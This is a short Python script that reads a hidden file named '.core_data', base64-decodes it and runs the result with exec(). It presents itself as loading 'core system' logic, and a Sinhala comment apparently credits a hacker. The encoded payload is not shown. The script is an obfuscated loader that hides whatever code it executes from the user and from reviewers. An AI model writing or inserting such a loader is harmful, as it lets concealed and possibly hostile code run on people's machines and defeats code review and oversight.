import base64
import os

def load_and_run():
    # .
    if os.path.exists(".core_data"):
        with open(".core_data", "r") as f:
            encoded_logic = f.read()
            #  උ ස්සන්න  නෙහ්  හැදුවේ  හිච්චි හැකර්
            try:
                exec(base64.b64decode(encoded_logic))
            except Exception as e:
                print(f"Error executing core logic: {e}")
    else:
        print("Critical Error: Core system files missing!")

if __name__ == "__main__":
    load_and_run()

